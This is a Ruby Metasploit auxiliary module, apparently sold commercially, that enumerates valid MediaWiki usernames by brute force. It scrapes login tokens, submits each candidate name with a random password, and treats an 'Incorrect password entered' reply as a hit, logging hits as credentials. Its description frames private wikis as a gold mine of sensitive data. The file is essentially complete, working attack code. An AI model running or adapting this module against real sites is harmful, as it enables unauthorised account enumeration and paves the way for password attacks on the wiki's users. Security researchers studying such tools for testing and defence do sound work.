##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/http'

module Metasploit
  module Framework
    module LoginScanner
      class MediaWikiUsername < ::Metasploit::Framework::LoginScanner::HTTP
        def attempt_login(credential)
          result_opts = {
            credential: credential,
            host: host,
            port: port,
            protocol: 'tcp',
            #service_name: 'http'
          }

          begin
            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
            configure_http_client(cli)
            cli.connect

            req = cli.request_cgi({
              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'index.php?title=Special:UserLogin',
            })

            res = cli.send_recv(req)

            cookie = res.get_cookies

            edit_token = $1 if res.body =~ /id="wpEditToken" type="hidden" value="(.*?)"/
            login_token = $1 if res.body =~ /name="wpLoginToken" type="hidden" value="(.*?)"/

            req = cli.request_cgi({
              'method' => 'POST',
              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'index.php?title=Special:UserLogin',
              'vars_post' => {
                'wpName' => credential.public,
                'wpPassword' => Rex::Text.rand_text_alpha(8),
                'authAction' => 'login',
                'wpLoginToken' => login_token,
                'wpEditToken' => edit_token,
                'wploginattempt' => 'Log in',
                'title' => 'Special:UserLogin',
                'force' => ''
              },
              'cookie' => cookie
            })

            res = cli.send_recv(req)

            if res.body =~ /Incorrect password entered/
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
            else
              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
            end
          rescue Exception => e
            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
          end

          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
        end
      end
    end
  end
end


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
        'Name'           => 'MediaWiki Username Bruteforce',
        'Description'    => %q(
        This module attempts to bruteforce valid usernames on a MediaWiki instance.

        MediaWiki is a popular open-source content management system and collaborative
        wiki used by busineses, non-profits, and hobbyists alike. Internal or private
        wikis can be a gold mine of sensitive information, high value targets,
        or network credentials. This is was tested agains 1.28.1.

        Categories: Open Source

        Price: 2

        Video: none

        OS: Multi

        Arch: Multi

        Requirements: Metasploit Framework
        ),
        'Author'         =>
          [
          ],
        'License'        => 'VolatileMinds',
        'References'     =>
          [
          ],
        'DefaultOptions' => {
            'RPORT'           => 80,
            'STOP_ON_SUCCESS' => true
        }
    )

    deregister_options('PASS_FILE', 'USERPASS_FILE', 'PASSWORD', 'BLANK_PASSWORDS', 'USER_AS_PASS', 'DB_ALL_PASS', 'DB_ALL_CREDS')
  end

  def run_host(ip)
    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
      user_file: datastore['USER_FILE'],
      username: datastore['USERNAME'],
      blank_passwords: true
    )

    scanner = Metasploit::Framework::LoginScanner::MediaWikiUsername.new(
      configure_http_login_scanner(
        host: ip,
        port: datastore['RPORT'],
        uri: datastore['TARGETURI'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword'],
      )
    )

    scanner.scan! do |result|
      creds = result.to_h
      creds.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )

      if result.success?
        credcore = create_credential(creds)
        creds[:core] = credcore
        create_credential_login(creds)
        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
      else
        invalidate_login(creds)
        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
      end
    end
  end
end
